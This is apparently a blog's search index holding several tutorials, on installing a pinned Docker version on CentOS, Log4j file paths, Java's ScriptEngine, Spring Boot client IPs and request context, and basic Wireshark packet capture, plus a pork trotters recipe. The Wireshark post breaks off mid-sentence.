<?xml version="1.0" ?>
  <search>
    <entry>
      
      
      <title>How to Install a Specific Version of Docker on CentOS</title>
      
      
      <link href="/posts/3776602279/"/>
      
      
      <url>/posts/3776602279/</url>
      
      
        
      <content type="html"><![CDATA[<p>Docker is a popular containerization technology that allows you to quickly create, deploy, and run applications. However, sometimes you may need to install a specific version of Docker instead of the latest version. In this article, we’ll walk you through the steps to install a specific version of Docker on CentOS.</p><h3 id="Step-1-Install-Necessary-Packages"><a href="#Step-1-Install-Necessary-Packages" class="headerlink" title="Step 1: Install Necessary Packages"></a>Step 1: Install Necessary Packages</h3><p>First, you need to install some necessary packages, including <code>yum-utils</code>, <code>device-mapper-persistent-data</code>, and <code>lvm2</code>. These packages will help you configure Docker storage drivers and LVM volumes.</p><p>You can install these packages using the following command:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install -y yum-utils device-mapper-persistent-data lvm2</span><br></pre></td></tr></tbody></table></figure><h3 id="Step-2-Add-Docker-Repository"><a href="#Step-2-Add-Docker-Repository" class="headerlink" title="Step 2: Add Docker Repository"></a>Step 2: Add Docker Repository</h3><p>Next, you need to add the Docker repository. You can add the Docker repository to your CentOS system using the following command:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</span><br></pre></td></tr></tbody></table></figure><p>Alternatively, if you’re in China, you can use the Aliyun mirror by running the following command:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br></pre></td></tr></tbody></table></figure><p>This will add the YUM repository configuration file for the Docker repository.</p><h3 id="Step-3-Update-YUM-Cache"><a href="#Step-3-Update-YUM-Cache" class="headerlink" title="Step 3: Update YUM Cache"></a>Step 3: Update YUM Cache</h3><p>Once the Docker repository has been added to the system, you need to update the YUM cache to be able to install packages from the repository. You can update the YUM cache using the following command:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum makecache</span><br></pre></td></tr></tbody></table></figure><h3 id="Step-4-Install-Specific-Version-of-Docker"><a href="#Step-4-Install-Specific-Version-of-Docker" class="headerlink" title="Step 4: Install Specific Version of Docker"></a>Step 4: Install Specific Version of Docker</h3><p>Finally, you can install the specific version of Docker that you need using the following command:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install docker-ce-&lt;VERSION_STRING&gt; docker-ce-cli-&lt;VERSION_STRING&gt; containerd.io</span><br></pre></td></tr></tbody></table></figure><p>Where <code>&lt;VERSION_STRING&gt;</code> is the version number of the Docker version you want to install. For example, if you want to install Docker version 20.10.8, you can use the following command:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install docker-ce-20.10.8 docker-ce-cli-20.10.8 containerd.io</span><br></pre></td></tr></tbody></table></figure><h3 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h3><p>In this article, we’ve shown you how to install a specific version of Docker on CentOS. By following these four simple steps, you can successfully install the Docker version you need and start using Docker for containerized development and deployment. If you encounter any issues, please refer to the official Docker documentation or community support.</p><p><a href="https://docs.docker.com/engine/install/centos/#install-using-the-repository">Install Docker Engine on CentOS | Docker Documentation</a></p>]]></content>
      
      
      
      
      <categories>
        
          
          
        <category> Backend Development </category>
        
          
      
      </categories>
      
      
      
        
      <tags>
        
            
            
        <tag> Backend Development </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>How to Get Log4j Log File Path in Java</title>
      
      
      <link href="/posts/735037507/"/>
      
      
      <url>/posts/735037507/</url>
      
      
        
      <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>Log4j is one of the widely used logging tools on the Java platform. It allows configuration of logging output to various destinations, such as console, file, and database. In real-world applications, it is often necessary to obtain the file path of the Log4j log file for viewing, analysis, and processing purposes. In this blog, we will discuss a method to obtain the Log4j log file path using Java code.</p><h1 id="Code-example"><a href="#Code-example" class="headerlink" title="Code example"></a>Code example</h1><p>In Log4j, a Logger instance can be used to get all of its Appenders using the getAppenders() method. An Appender is an abstract class with several concrete subclasses, such as ConsoleAppender, FileAppender, and RollingFileAppender. The FileAppender and RollingFileAppender subclasses are used to output logs to a file.</p><p>To obtain the file path of a RollingFileAppender instance, we can traverse all the Appenders of a Logger instance, and check each Appender instance to see if it is a RollingFileAppender instance. If we find one, we can then obtain the file path by calling the getFileName() method of the RollingFileAppender instance.</p><p>Here is an example code snippet that demonstrates this process:</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.core.Appender;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.core.appender.RollingFileAppender;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Log4jUtils</span> {</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getLogPath</span><span class="params">(Logger logger)</span> {</span><br><span class="line">        Map&lt;String, Appender&gt; appenderMap = ((org.apache.logging.log4j.core.Logger) logger).getAppenders();</span><br><span class="line">        <span class="keyword">if</span> (appenderMap == <span class="literal">null</span>) {</span><br><span class="line">            <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">for</span> (Appender appender : appenderMap.values()) {</span><br><span class="line">            <span class="keyword">if</span> (appender <span class="keyword">instanceof</span> RollingFileAppender) {</span><br><span class="line">                <span class="keyword">return</span> ((RollingFileAppender) appender).getFileName();</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {</span><br><span class="line">        <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(Log4jUtils.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">logPath</span> <span class="operator">=</span> getLogPath(logger);</span><br><span class="line">        System.out.println(logPath);</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>In this code, we first cast the Logger instance to the org.apache.logging.log4j.core.Logger type and then call the getAppenders() method to get all the Appenders. We then traverse each Appender instance and check if it is an instance of RollingFileAppender. If we find one, we obtain its file path by calling the getFileName() method.</p><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p> In this blog, we have discussed a method to obtain the file path of a Log4j log file using Java code. By traversing the Appenders of a Logger instance and checking if it is a RollingFileAppender instance, we can obtain its file path. This method can be useful for viewing, analyzing, and processing Log4j log files.</p>]]></content>
      
      
      
      
      <categories>
        
          
          
        <category> Backend Development </category>
        
          
      
      </categories>
      
      
      
        
      <tags>
        
            
            
        <tag> Backend Development </tag>
        
            
            
        <tag> Java </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>How to Execute JavaScript Code and Functions in Java</title>
      
      
      <link href="/posts/2250085940/"/>
      
      
      <url>/posts/2250085940/</url>
      
      
        
      <content type="html"><![CDATA[<p>JavaScript is a popular scripting language used for developing dynamic and interactive web pages. While JavaScript is primarily used in web development, it can also be used in other areas such as server-side scripting, desktop applications, and mobile apps. In this blog, we will explore how to execute JavaScript code and functions in Java.</p><p>To execute JavaScript code in Java, we can use the ScriptEngine class provided by the Java API. The ScriptEngine class is used to execute scripts written in various languages, including JavaScript. Here is a sample code that demonstrates how to execute JavaScript code in Java:</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.script.ScriptEngine;</span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngineManager;</span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavaScriptExecutor</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {</span><br><span class="line">        <span class="comment">// Create a ScriptEngineManager object</span></span><br><span class="line">        <span class="type">ScriptEngineManager</span> <span class="variable">manager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ScriptEngineManager</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Get the JavaScript engine</span></span><br><span class="line">        <span class="type">ScriptEngine</span> <span class="variable">engine</span> <span class="operator">=</span> manager.getEngineByName(<span class="string">"javascript"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            <span class="comment">// Execute JavaScript code</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">script</span> <span class="operator">=</span> <span class="string">"var a = 1 + 2; a;"</span>;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> engine.eval(script);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Print the result</span></span><br><span class="line">            System.out.println(result);</span><br><span class="line">        } <span class="keyword">catch</span> (ScriptException e) {</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>In this example, we create a ScriptEngineManager object and get the JavaScript engine using the getEngineByName method. Then we execute the JavaScript code using the eval method of the ScriptEngine class and store the result in an Object variable. Finally, we print the result to the console.</p><p>To execute JavaScript functions in Java, we can define the function in JavaScript code and then call it from our Java code using the ScriptEngine class. Here is a sample code that demonstrates how to execute JavaScript functions in Java:</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.script.ScriptEngine;</span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptEngineManager;</span><br><span class="line"><span class="keyword">import</span> javax.script.ScriptException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JavaScriptFunctionExecutor</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {</span><br><span class="line">        <span class="comment">// Create a ScriptEngineManager object</span></span><br><span class="line">        <span class="type">ScriptEngineManager</span> <span class="variable">manager</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ScriptEngineManager</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Get the JavaScript engine</span></span><br><span class="line">        <span class="type">ScriptEngine</span> <span class="variable">engine</span> <span class="operator">=</span> manager.getEngineByName(<span class="string">"javascript"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            <span class="comment">// Define a JavaScript function</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">script</span> <span class="operator">=</span> <span class="string">"function add(a, b) { return a + b; }"</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Execute the JavaScript function and get the result</span></span><br><span class="line">            engine.eval(script);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> engine.eval(<span class="string">"add(1, 2)"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Print the result</span></span><br><span class="line">            System.out.println(result);</span><br><span class="line">        } <span class="keyword">catch</span> (ScriptException e) {</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>In this example, we define a JavaScript function called add that takes two arguments and returns their sum. Then we execute the function using the eval method of the ScriptEngine class and store the result in an Object variable. Finally, we print the result to the console.</p><p>In conclusion, the ScriptEngine class provided by the Java API allows us to execute JavaScript code and functions in Java. By leveraging the power of both languages, we can create more powerful and dynamic applications.</p>]]></content>
      
      
      
      
      <categories>
        
          
          
        <category> Backend Development </category>
        
          
      
      </categories>
      
      
      
        
      <tags>
        
            
            
        <tag> Backend Development </tag>
        
            
            
        <tag> Java </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>How to make braised pork trotters</title>
      
      
      <link href="/posts/1037676127/"/>
      
      
      <url>/posts/1037676127/</url>
      
      
        
      <content type="html"><![CDATA[<blockquote><p>Braised pork trotters are a beloved dish in many Asian cuisines. It’s a rich, flavorful, and comforting dish that’s perfect for cold days or for any occasion. In this recipe, we’ll go through the steps of making a simple and delicious braised pork trotters dish.</p></blockquote><h1 id="Ingredients"><a href="#Ingredients" class="headerlink" title="Ingredients"></a>Ingredients</h1><ul><li>4 pork trotters</li><li>10g ginger slices</li><li>50ml Shaoxing wine</li><li>50ml light soy sauce</li><li>25ml dark soy sauce</li><li>20g rock sugar</li><li>2 star anise</li><li>1 piece cinnamon bark</li><li>2 bay leaves</li><li>Salt to taste</li><li>Water</li></ul><h1 id="Instructions"><a href="#Instructions" class="headerlink" title="Instructions"></a>Instructions</h1><ol><li>Clean the pork trotters: Rinse the pork trotters under cold water to remove any dirt or debris. Then, blanch the trotters in boiling water for a few minutes to get rid of any impurities. After that, rinse the trotters under cold water again.</li><li>Boil the pork trotters: In a large pot, add the pork trotters, ginger slices, and Shaoxing wine. Cover the trotters with enough water and bring it to a boil over high heat. Once the water boils, reduce the heat to low and let the pork trotters simmer for 10 minutes. Skim off any foam that rises to the surface.</li><li>Add the seasoning: Add the light soy sauce, dark soy sauce, rock sugar, star anise, cinnamon bark, and bay leaves. Stir the ingredients to combine, and bring the mixture to a boil again.</li><li>Simmer the pork trotters: Once the mixture boils, reduce the heat to low and let the pork trotters simmer for 2 hours, or until the meat is tender and falls off the bone. Add salt to taste.</li><li>Let the pork trotters cool: Turn off the heat and let the pork trotters cool in the pot. This will help them absorb more flavor.</li><li>Serve: Once the pork trotters are cool, remove them from the pot and place them on a plate. You can serve them with steamed rice or your favorite vegetables.</li></ol><h1 id="Tips-for-Making-Braised-Pork-Trotters"><a href="#Tips-for-Making-Braised-Pork-Trotters" class="headerlink" title="Tips for Making Braised Pork Trotters"></a>Tips for Making Braised Pork Trotters</h1><ul><li>For a richer and thicker sauce, you can add cornstarch or potato starch to the sauce.</li><li>You can also add other ingredients like garlic, scallions, or dried mushrooms to the pot for additional flavor.</li><li>If you don’t have Shaoxing wine, you can substitute it with dry sherry or rice wine.</li></ul><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>Braised pork trotters are a classic dish that’s hearty, flavorful, and easy to make. This dish is perfect for any occasion, and it’s sure to impress your family and friends. Follow this recipe and enjoy a delicious and satisfying meal!</p>]]></content>
      
      
      
      
      <categories>
        
          
          
        <category> Recipe </category>
        
          
      
      </categories>
      
      
      
        
      <tags>
        
            
            
        <tag> Life </tag>
        
            
            
        <tag> Recipe </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>How to Retrieve User Addresses in a Spring Boot Application</title>
      
      
      <link href="/posts/1268933518/"/>
      
      
      <url>/posts/1268933518/</url>
      
      
        
      <content type="html"><![CDATA[<p>When building a web application, it’s often necessary to retrieve the IP address of the user who is accessing the application. This information can be useful for various purposes, such as security, analytics, and customization. In this tutorial, we will explore how to retrieve both IPv4 and IPv6 addresses of a user in a Spring Boot application.</p><h2 id="Retrieving-User-IP-Address"><a href="#Retrieving-User-IP-Address" class="headerlink" title="Retrieving User IP Address"></a>Retrieving User IP Address</h2><p>In Spring Boot, we can retrieve the IP address of a user by injecting a <code>HttpServletRequest</code> object into our controller class and calling its <code>getRemoteAddr()</code> method. For example:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">@RestController</span><br><span class="line">public class UserController {</span><br><span class="line"></span><br><span class="line">    @Autowired</span><br><span class="line">    private HttpServletRequest request;</span><br><span class="line"></span><br><span class="line">    @GetMapping("/user/ip")</span><br><span class="line">    public String getUserIP() {</span><br><span class="line">        String ipAddress = request.getRemoteAddr();</span><br><span class="line">        return ipAddress;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>In the above code, we have injected a <code>HttpServletRequest</code> object using the <code>@Autowired</code> annotation and defined a <code>getUserIP()</code> method that returns the IP address of the user. The <code>getRemoteAddr()</code> method of the <code>HttpServletRequest</code> object returns the IP address of the client or the last proxy that sent the request.</p><p>However, this method may not always return the correct IP address. In some cases, the IP address may be the address of a proxy server or load balancer rather than the actual user’s IP address. To obtain the correct IP address, we can check for the <code>X-Forwarded-For</code> header, which is a standard header used by proxies to indicate the originating IP address of a client connecting to a web server through the proxy. Here’s an updated version of the code that checks for the <code>X-Forwarded-For</code> header:</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> {</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> HttpServletRequest request;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping("/user/ip")</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUserIP</span><span class="params">()</span> {</span><br><span class="line">        <span class="type">String</span> <span class="variable">ipAddress</span> <span class="operator">=</span> request.getHeader(<span class="string">"X-Forwarded-For"</span>);</span><br><span class="line">        <span class="keyword">if</span> (ipAddress == <span class="literal">null</span> || ipAddress.isEmpty() || <span class="string">"unknown"</span>.equalsIgnoreCase(ipAddress)) {</span><br><span class="line">            ipAddress = request.getRemoteAddr();</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> ipAddress;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>In the above code, we first check for the <code>X-Forwarded-For</code> header using the <code>getHeader()</code> method of the <code>HttpServletRequest</code> object. If the header is not present or its value is empty or “unknown”, we fall back to the <code>getRemoteAddr()</code> method to obtain the IP address.</p>]]></content>
      
      
      
      
      <categories>
        
          
          
        <category> Backend Development </category>
        
          
      
      </categories>
      
      
      
        
      <tags>
        
            
            
        <tag> Backend Development </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>Java Thread Context: How to Determine Whether You're in a Request Context</title>
      
      
      <link href="/posts/2685105031/"/>
      
      
      <url>/posts/2685105031/</url>
      
      
        
      <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>When developing Java web applications, it is often necessary to check whether the current thread is in a request context. A request context is a context that holds information about a single HTTP request and is typically used in web applications. In this blog post, we will explore how to determine whether the current thread is in a request context using Spring Framework’s <code>RequestContextHolder</code> class.</p><h2 id="The-RequestContextHolder-Class"><a href="#The-RequestContextHolder-Class" class="headerlink" title="The RequestContextHolder Class"></a>The RequestContextHolder Class</h2><p>The <code>RequestContextHolder</code> class is a utility class provided by Spring Framework that allows you to bind the current HTTP request and response to the current thread. It provides access to the current request and response objects and allows you to access request attributes.</p><h2 id="Checking-if-the-Current-Thread-is-in-a-Request-Context"><a href="#Checking-if-the-Current-Thread-is-in-a-Request-Context" class="headerlink" title="Checking if the Current Thread is in a Request Context"></a>Checking if the Current Thread is in a Request Context</h2><p>To check if the current thread is in a request context, we can use the <code>RequestContextHolder.getRequestAttributes()</code> method. This method returns the current request attributes associated with the current thread. If there are no request attributes associated with the current thread, it means that the current thread is not in a request context.</p><p>Here’s an example implementation of a <code>RequestContextChecker</code> class that uses <code>RequestContextHolder</code> to check if the current thread is in a request context:</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestAttributes;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RequestContextChecker</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isCurrentThreadInRequestContext</span><span class="params">()</span> {</span><br><span class="line">        <span class="type">RequestAttributes</span> <span class="variable">requestAttributes</span> <span class="operator">=</span> RequestContextHolder.getRequestAttributes();</span><br><span class="line">        <span class="keyword">return</span> requestAttributes != <span class="literal">null</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>In the code above, the <code>isCurrentThreadInRequestContext()</code> method calls <code>RequestContextHolder.getRequestAttributes()</code> to get the request attributes associated with the current thread. If there are request attributes associated with the current thread, the method returns <code>true</code>. Otherwise, it returns <code>false</code>.</p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>In this  post, we’ve seen how to check if the current thread is in a request context using Spring Framework’s <code>RequestContextHolder</code> class. By using <code>RequestContextHolder.getRequestAttributes()</code>, we can determine if the current thread is in a request context and take appropriate actions based on the result. It’s important to note that this method is only applicable to web applications that use Spring Framework. For other types of request contexts, you may need to use a different method to determine if the current thread is in a request context.</p>]]></content>
      
      
      
      
      <categories>
        
          
          
        <category> Backend Development </category>
        
          
      
      </categories>
      
      
      
        
      <tags>
        
            
            
        <tag> Backend Development </tag>
        
            
            
        <tag> Trap </tag>
        
            
        
      </tags>
      
      
    
    </entry>
    <entry>
      
      
      <title>Wireshark Basic Usage</title>
      
      
      <link href="/posts/20069/"/>
      
      
      <url>/posts/20069/</url>
      
      
        
      <content type="html"><![CDATA[<h2 id="一、Introduction"><a href="#一、Introduction" class="headerlink" title="一、Introduction"></a>一、Introduction</h2><p>Wireshark is currently one of the most widely used network packet analysis software in the world. The function of network packet analysis software is to listen to network packets and display the most detailed network packet information as much as possible. Wireshark uses Winpcap as the interface to directly exchange data packets with the network card.</p><p>The following figure shows the initial interface after successfully installing Winpcap and Wireshark:</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/20069/image-20200608181205658.png" alt="image-20200608181205658"></p><p>In the initial interface of Wireshark, the fluctuating line represents the fluctuation of the information transmitted by the network card. Click the start icon in the upper left corner to enter the packet capture page shown in the following figure:</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/20069/image-20200608181307861.png" alt="image-20200608181307861"></p><h2 id="二、Packet-Capture-and-Analysis"><a href="#二、Packet-Capture-and-Analysis" class="headerlink" title="二、Packet Capture and Analysis"></a>二、Packet Capture and Analysis</h2><p>This example demonstrates packet capture using the curl and ping commands.<br>Start capturing with Wireshark, and then, as shown in the following figure, use the curl and ping commands in the terminal to interact with the target address:</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/20069/image-20200608173101731.png" alt="image-20200608173101731"></p><p>​                </p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/20069/image-20200608174203428.png" alt="image-20200608174203428"></p><blockquote><p> From the response packets of ping, we can see that we received 7 response packets. The IP address of Baidu here is 14.215.177.39.</p></blockquote><p>Returning to Wireshark, filter the packets by IP address in the filter, as shown in the following figure is the result of filtering the packets. The filter command is:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.addr ==14.215.177.39 </span><br></pre></td></tr></tbody></table></figure><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/20069/image-20200608173431410.png" alt="image-20200608173431410"></p><h3 id="1-TCP-Three-Way-Handshake-Analysis"><a href="#1-TCP-Three-Way-Handshake-Analysis" class="headerlink" title="1.TCP Three-Way Handshake Analysis"></a>1.TCP Three-Way Handshake Analysis</h3><p>Viewing the packets, in the above figure, packets 1-3 are using the TCP protocol, and packet 4 is using the HTTP protocol, which is a clear sign of the TCP three-way handshake. The first three packets are the process of the TCP three-way handshake. The following figure shows the detailed packet contents of the TCP three-way handshake, which can be compared with the packet flag bits of the TCP three-way handshake.</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/20069/JSYW201709050_01100.jpg" alt="img"></p><h3 id="2-ICMP-Protocol-Analysis"><a href="#2-ICMP-Protocol-Analysis" class="headerlink" title="2.ICMP Protocol Analysis"></a>2.ICMP Protocol Analysis</h3><p>The ping command belongs to the ICMP protocol. Viewing the ICMP packets in the filtered packets, we can observe 14 packets. As mentioned earlier, 7 response packets were received for the ping destination address.</p><p>ICMP packets have two modes: request and response. See the following figure for details:：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/20069/image-20200608174410800.png" alt="image-20200608174410800"></p><p><strong>The ICMP Request and Reply message formats are as follows:</strong></p><p>Request：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/20069/image-20200608174514228.png" alt="image-20200608174514228"></p><p> Reply：</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/20069/image-20200608174532582.png" alt="image-20200608174532582"></p><blockquote><p>Type indicates the type of ICMP message, 8 for request messages and 0 for reply messages;</p><p>Code = 0;</p><p>CheckSum is the checksum from the ICMP header (starting with Type) to the end of the data (ending with the entire packet);</p><p>Identifier is the identifier set by the host, usually set to the process ID. The identifier in the response message is the same as the identifier in the original message;</p><p>Sequence Number is the sequence number set by the host, usually set to an increasing sequence starting from 0. The sequence number in the response message is the same as the sequence number in the original message;</p><p>Data is the data set by the host. The data in the response message is the same as the data in the original message;</p><p>Note: The Identifier and Sequence 